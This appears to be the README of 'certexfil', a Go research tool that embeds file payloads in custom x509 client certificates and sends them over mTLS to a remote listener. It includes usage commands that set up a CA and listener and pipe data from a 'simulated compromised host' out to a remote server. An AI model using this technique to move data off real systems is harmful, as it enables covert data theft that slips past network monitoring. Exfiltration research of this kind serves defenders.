# X509 Digital Certificate Exfiltration Exploration

## Overview

My extensive exploration into data exfiltration and related countermeasures has led to this initial foray into Go. The aim is to devise a swift method for transforming a payload (via file reading) into a custom x509 digital certificate.

Further details can be found at [this Medium article](https://medium.com/@jeanmichel.amblat/abusing-certificates-for-data-exfiltration-d6bff2533cd0).

For those new to certificates and mTLS, these insightful resources are recommended:

* [TLS, X509, and Mutual Authentication Explained](https://medium.com/sitewards/the-magic-of-tls-x509-and-mutual-authentication-explained-b2162dec4401)
* [A Step-by-Step Guide to mTLS in Go](https://venilnoronha.io/a-step-by-step-guide-to-mtls-in-go)

Certexfil operates in three modes: CA generation, client, and listener.

* `--ca` initializes a CA for certificate creation and authentication.
* `--payload` incorporates a file payload into a new client certificate for mTLS with a listener service.
* `--listen` launches a service that validates mTLS clients and extracts embedded payloads.

## Usage

### Setting Up CA and Listener on a Remote Server

To create `server_cert.pem` and `server_key.pem` for mTLS:

```shell
somewhere$ certexfil -ca -ecdsa-curve P521 --host remote.host.com
```

Ensure the certexfil binary and ./CERTS directory are on your remote server. Then, initiate the mTLS listener:
```shell
remoteserver$ ./certexfil --listen
```

Client or Simulated Compromised Host

Embedding output as a payload:

```shell
06:46:00 jma@wintermute Go-Workspace → echo 'w00t w00t' | certexfil --host remote.server.com  --payload -
2019/05/31 18:48:27 [*] Reading from stdin..
2019/05/31 18:48:27 [D] Payload (raw)  --> w00t w00t...	(9 bytes)
2019/05/31 18:48:27 [D] Payload (Prepare()) --> �...		(31 bytes)
2019/05/31 18:48:27 [*] Generated custom cert with payload
Oo
```
This format should make it easier to use as a README or other documentation.

## Contact

* @Sourcefrenchy
